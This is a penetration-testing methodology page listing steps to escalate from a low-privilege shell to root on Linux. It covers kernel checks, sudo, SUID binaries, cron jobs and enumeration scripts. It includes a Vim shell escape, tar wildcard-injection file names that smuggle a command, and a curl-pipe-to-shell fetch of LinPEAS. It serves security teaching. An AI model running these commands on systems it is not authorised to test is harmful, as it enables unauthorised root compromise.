---
title: "Linux Privilege Escalation Methodology"
description: "A structured checklist and methodology for escalating privileges on a compromised Linux host, covering SUID/SGID, cron jobs, kernel exploits, and configuration issues."
phase: "Privilege Escalation"
order: 1
---

Once you obtain a low-privilege shell on a Linux system, the next goal is to escalate your access to `root`. This methodology provides a systematic checklist to find local privilege escalation vectors.

---

## 1. System Information Gathering

Before searching for misconfigurations, understand the system environment.

### Kernel & OS Info
```bash
# Check OS release
cat /etc/*release

# Check kernel version
uname -a
```
*Look for kernel versions vulnerable to DirtyCOW, Dirty Pipe (CVE-2022-0847), or PwnKit (CVE-2021-4034).*

### Environment Variables
```bash
env
```
*Look for secrets, API keys, or custom PATH configurations.*

---

## 2. User & Privileges Enumeration

### Who are you?
```bash
whoami
id
```
*Check if you belong to sensitive groups like `sudo`, `admin`, `docker`, `lxd`, or `disk`.*

### Sudo Permissions
```bash
sudo -l
```
*Can you execute commands as root without a password? Check [GTFOBins](https://gtfobins.github.io) for binaries that can be abused.*

---

## 3. SUID and SGID Binaries

SUID (Set owner User ID) allows a file to be executed with the permissions of the file owner (often root).

### Find all SUID files
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Abuse Vectors
Look for standard SUID binaries that shouldn't be there, or custom scripts:
- **Nmap** (interactive mode)
- **Find** (`-exec` parameter)
- **Vim** (`:py import os; os.system('/bin/sh')`)
- **Bash** (`bash -p`)

---

## 4. Scheduled Tasks (Cron Jobs)

Cron jobs run periodically under specific user privileges. If we can write to scripts executed by root's cron jobs, we gain root execution.

### View system crontab
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

### Search for writable cron scripts
```bash
# Find scripts run by cron that we can edit
ls -la /opt/ /var/www/ /tmp/
```

### Wildcard Injection
If a cron job runs a tar command with a wildcard `*`, you can inject parameters:
```bash
touch "/home/user/--checkpoint=1"
touch "/home/user/--checkpoint-action=exec=sh shell.sh"
```

---

## 5. Automated Enumeration Scripts

If manual enumeration is slow, transfer and run automated scripts:
- **LinPEAS**: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
- **Linux Exploit Suggester**: Analyzes `uname -a` output and suggests potential kernel exploits.
